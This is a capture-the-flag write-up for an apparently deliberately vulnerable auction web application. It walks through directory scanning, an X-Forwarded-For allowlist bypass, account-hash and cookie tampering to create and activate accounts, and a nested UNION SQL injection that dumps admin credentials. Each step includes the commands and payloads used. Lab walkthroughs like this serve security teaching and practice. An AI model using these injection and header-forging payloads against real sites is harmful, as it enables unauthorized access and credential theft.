
## Flag 1

Try to guess the path, in ``robots.txt``

```html
User-agent: *
Disallow: s3cr3t-4dm1n/
```

But it gives a ``403`` response while accessing ``s3cr3t-4dm1n``. Try to scan any subpath in ``s3cr3t-4dm1n/`` with ``dirb``.

```bash
dirb http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n ../dirb222/wordlists/common.txt
```

```bash
---- Scanning URL: http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ ----                                                                                       
+ http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess (CODE:200|SIZE:69)
...
```

Now we have an accessible path ``.htaccess``. Request the file it with ``httpie``.

```html
http -v http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/.htaccess

GET /c9c213fc7b/s3cr3t-4dm1n/.htaccess HTTP/1.1
User-Agent: HTTPie/1.0.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Host: 35.227.24.107



HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Mon, 29 Mar 2021 06:16:00 GMT
Content-Type: plain/text
Transfer-Encoding: chunked
Connection: keep-alive
Content-disposition: attachment; filename=.htaccess

Order Deny,Allow
Deny from all
Allow from 8.8.8.8
Allow from 8.8.4.4
```

Allowed IPs are ``8.8.8.8`` and ``8.8.4.4``. Now try to request ``s3cr3t-4dmin`` again with one of these IPs.

```
http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ X-Forwarded-For:8.8.8.8
```

In response there is one flag and admin login form.


## Flag 2

Register a user account and login with it, there are four options in dashboard. Switch to subusers, it allows us to register subuser under current user account. The request needs three parameters, ``owner_hash``, ``new_username`` and ``new_password``. It's slightly different from register form at home page, try to request a new account with ``owner_hash`` parameter and the value is account hash of user ``hunter2``. Account hash of user ``hunter2`` is located in a hidden field in password reset page.

```bash
http -v --form POST http://35.227.24.107/c9c213fc7b/register owner_hash=cf505baebbaf25a0a4c63eb93331eb36 new_username=888 new_password=onetwo
```

Now the new user ``888`` has been created, login with it, the account is still awaiting activation, but we get the second flag.


## Flag 3


To activate user ``888``, we need to login as another user ``one`` to use the subuser enable function, but change the subuser hash to ``888``'s account hash and ``userhash`` in cookie to ``hunter2``'s account hash.

```bash
http -v --form POST http://35.227.24.107/c9c213fc7b/dashboard/subusers \
  "Cookie:token=MzY4MGM4Nzg5YTQzMTEwYzc4MmZjZmNjZTg5ODJhYTc5NWUyZDU4OWZlZTNkMmFlZjliZDBlNjgwNjQ1ZGQzMDQ2YWYyZTAzYmU1Mzk3MzEzMjA1YTQxYzdkNDYwYWI3OTRjZGI4Y2UzODBmOTdmZWQ3MmExZjgyYWQwZGU2YjM%3D;userhash=cf505baebbaf25a0a4c63eb93331eb36"\
  hash=1997b46b3fea065fa085562a6a6dcc09\
  enable_toggle=enable

```

After the previous step, logout user ``one`` and login as user ``888``, the third flag is right under user details.


## Flag 4

In source code of ``Your Auctions`` section exists a subpath``auctions/questions``, it takes one parameter ``id``, which is auction type id from ``1`` to ``5``.

```js
{"name":"Desktops","questions":[{"question":"Make","field_name":"field_4728_186574"},{"question":"Model","field_name":"field_5738_281961"},{"question":"RAM","field_name":"field_5051_369408"},{"question":"Processors","field_name":"field_4032_347621"}],"auctions":[{"id":"1","title":"Ultra Desktop"},{"id":"9","title":"Premium Desktop"},{"id":"10","title":"Work Station"}]}
```

If we give it ``id=0``, error message returns.

```js
{"error":"Invalid auction type ID entered"}
```

A normal response contains three fields, ``name``, ``questions`` and ``auctions``. Try to use ``union`` to guess some information out of it. 


```sql
0 union select '0 union select 1',2,'[]' --
```

Payload above give us the following response.

```js
{"name":"[]","questions":[],"auctions":[]}
```

Keep adding column numbers until something different shown.

```sql
0 union select '0 union select 1,2,3,4,5,6,7,8,9',10,'[]' --
```

In response column ``1`` was taken as auction id, column ``6`` was taken as title and name was replaced by ``10``.

```js
{"name":"10","questions":[],"auctions":[{"id":"1","title":"6"}]}
```

Now chage ``1`` to ``table_name`` to get table names from ``information_schema``.

```sql
0 union select '0 union select table_name,2,3,4,5,6,7,8,9 from information_schema.tables',10,'[]' --
```

In output, table ``admin`` and ``auction`` are interesting.

```js
{"name":"10","questions":[],"auctions":[{"id":"admin","title":"6"},{"id":"auction","title":"6"},
{"id":"ALL_PLUGINS","title":"6"},{"id":"APPLICABLE_ROLES","title":"6"},
{"id":"CHARACTER_SETS","title":"6"},{"id":"COLLATIONS","title":"6"},
{"id":"COLLATION_CHARACTER_SET_APPLICABILITY","title":"6"},
{"id":"COLUMNS","title":"6"},
{"id":"COLUMN_PRIVILEGES","title":"6"},
{"id":"ENABLED_ROLES","title":"6"},
{"id":"ENGINES","title":"6"},
{"id":"EVENTS","title":"6"},
{"id":"FILES","title":"6"},
...
```

Try to list columns in table ``admin``.

```sql
0 union select '0 union select COLUMN_NAME,2,3,4,5,6,7,8,9 from INFORMATION_SCHEMA.COLUMNS where table_name="admin"',10,'[]' --
```

```js
{"name":"10","questions":[],"auctions":[{"id":"id","title":"6"},{"id":"username","title":"6"},{"id":"password","title":"6"}]}
```

Now we know there are three columns in the table, try to fetch ``username`` and ``password`` from it, replace column ``1`` with ``username`` and column ``6`` with ``password``.

```sql
0 union select '0 union select username,2,3,4,5,password,7,8,9 from admin',10,'[]' --
```

```js
{"name":"10","questions":[],"auctions":[{"id":"h4ckerbayadmin","title":"auction$rFun!"}]}
```

So the username is ``h4ckerbayadmin`` and password is ``auction$rFun!``.

Remember the admin login page we get before? Now login with correct credential.

```bash
http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
  X-Forwarded-For:8.8.8.8 \
  username=h4ckerbayadmin \
  password="auction\$rFun!" 
```

Access admin page with received token.

```bash
http -v GET http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
  X-Forwarded-For:8.8.8.8 \
  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7
```

Input the auction hash shown in ``dashboard/auctions`` page while login as ``888``.

```bash
http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/\
  X-Forwarded-For:8.8.8.8 \
  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
  auction_hash=8ylbbgs2
```

Delete it with ``action=delete``

```bash
http -v --form POST http://35.227.24.107/c9c213fc7b/s3cr3t-4dm1n/ \
  X-Forwarded-For:8.8.8.8 \
  Cookie:admin-token=DF120B994C5FD4377A42F55D086F6EF7 \
  auction_hash=8ylbbgs2 \
  action=delete
```

The last flag is in response.
